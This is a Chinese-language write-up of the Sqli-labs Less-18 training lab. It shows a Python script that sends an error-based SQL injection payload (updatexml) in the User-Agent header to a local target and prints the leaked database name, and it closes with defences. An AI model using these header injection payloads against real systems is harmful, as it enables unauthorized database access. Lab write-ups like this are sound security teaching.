## 题目: Sqli-labs Less-18

## 题目描述
本关的页面包含 Username 和 Password 输入框。页面提示了 Your IP ADDRESS is: 127.0.0.1，并且会在登录成功后显示 Your User Agent is: ...。
这表明后端不仅记录了你的登录信息，还会将你的 User-Agent 写入数据库。本关的注入点不在于表单，而在于 HTTP 请求头。

## 解题思路
由于我们要利用的是 User-Agent 字段，且后台执行的语句是 INSERT INTO uagents (uagent, ...) VALUES ('$uagent', ...)，我们要通过构造 Payload 触发报错注入。

**⚠️ 核心踩坑点**：在 HTTP 请求头中，行尾的空格和换行极易被丢弃，导致常规的注释符 # 或 --+ 失效。因此，不能直接用注释符，而需要使用 **or '** 来补齐后面的单引号，实现无注释符的完美逃逸。

## 解题步骤

**1. 确认登录前置条件**
必须使用正确的账号密码登录成功（如 admin/admin），页面才会触发 INSERT 语句。

**2. 编写基于 Header 的报错注入脚本**

**实战 Payload 核心代码**：
```python
import requests
import re

url = "http://127.0.0.1/sqli-labs/Less-18/"
data = {'uname': 'admin', 'passwd': 'admin', 'submit': 'Submit'}
```
**核心 Payload：用 or ' 补齐，避开注释符失效的坑**
```python
payload = "' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '"

headers = {
    'User-Agent': payload
}

r = requests.post(url, data=data, headers=headers)

print("\n============== 寻找报错信息 ==============")
for line in r.text.split('\n'):
    if "XPATH" in line or "error" in line.lower():
        print(line.strip())
```
**3. 运行结果**
成功触发报错，爆出当前数据库名：
```text
XPATH syntax error: '~security~'
```

## 知识点总结
1. **Header 注入（HTTP 头部注入）**：注入点不在 URL 或表单中，而在 Cookie、User-Agent、X-Forwarded-For 等请求头中。
2. **注释符失效与 or ' 闭合**：在 Header 中传输时，末尾的空格或注释符可能被丢弃。使用 and 1=1 或 or ' 来闭合，是 Header 注入的经典技巧。
3. **报错注入限制**：updatexml 报错回显仅有 32 个字符长度，超过会截断。
4. **防御策略**：使用 PDO 预编译；对 HTTP 请求头数据进行严格过滤和转义；关闭数据库详细报错回显。
